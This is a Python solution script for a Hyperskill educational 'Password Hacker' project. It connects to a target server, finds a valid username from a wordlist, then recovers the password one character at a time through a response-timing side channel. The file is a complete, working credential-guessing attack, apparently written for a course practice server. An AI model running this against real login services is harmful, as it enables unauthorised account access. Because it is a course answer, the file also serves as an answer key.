# JBA Core Python - Password Hacker project
# https://hyperskill.org/projects/80
# Submitted by Chris Freeman : Stage 5/5 5-JAN-2023

import sys
import socket
import json
import time


def sendit(sock, data):
    sock.send(data.encode())
    resp_b = sock.recv(1024)
    return resp_b.decode()


alphabet = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&()*+,-./:;<=>?@[]^_`{|}~'
filename = sys.argv[0]      # program file name
hostname = sys.argv[1]      # target hostname (string)
port_no = sys.argv[2]       # target port number (integer)

address = (hostname, int(port_no))  # construct internet address
client_socket = socket.socket()  # create socket
client_socket.connect(address)  # connect to specified address
pfile = open('jba_logins.txt', 'r', encoding='utf-8')
login_found = False
letter_found = False
password_found = False
login_d = {"login": "admin", "password": " "}
for login_r in pfile:
    login_text = login_r.strip()    # remove surrounding whitespace and newlines
    login_d["login"] = login_text   # place the username in login field
    login_data = json.dumps(login_d)    # convert to JSON
    login_resp = sendit(client_socket, login_data)  # forward to Internet site and get response
    login_resp_d = json.loads(login_resp)   # convert JSON response to dictionary
    # print(login_resp_d)
    if login_resp_d["result"] == "Wrong password!":  # did we hit the right login?
        login_found = True                           # YES... move on!
        break
# print("login: ", login_text)
pfile.close()   # login file no longer needed

while not password_found:
    pw_base = ''
    for _ in range(16):                         # up to 16 letter passwords...
        for c in alphabet:                      # try every letter
            pw_text = pw_base + c               # construct password try
            login_d["password"] = pw_text       # place in password field
            # print(login_d)
            login_data = json.dumps(login_d)    # convert to JSON
            clock_on = time.perf_counter()
            login_resp = sendit(client_socket, login_data)  # forward to Internet and get response
            clock_off = time.perf_counter()
            login_resp_d = json.loads(login_resp)  # convert JSON response to dictionary
            elapsed = clock_off - clock_on
            # print("Response: ", login_resp_d, "Elapsed: ", elapsed)
            if elapsed > 0.05:
                letter_found = True           # next letter found. Go to next level...
                break
            elif login_resp_d["result"] == "Connection success!":
                password_found = True
                break
        if password_found:
            break
        if letter_found:
            pw_base = pw_base + c
            # print("pw_base: ", pw_base)
            letter_found = False
        else:
            password_found = True
            print("next letter not found!")
            break   # next letter not found. Abort break-in

# print("Password: ", pw_text)
if password_found:
    print(json.dumps(login_d))
client_socket.close()
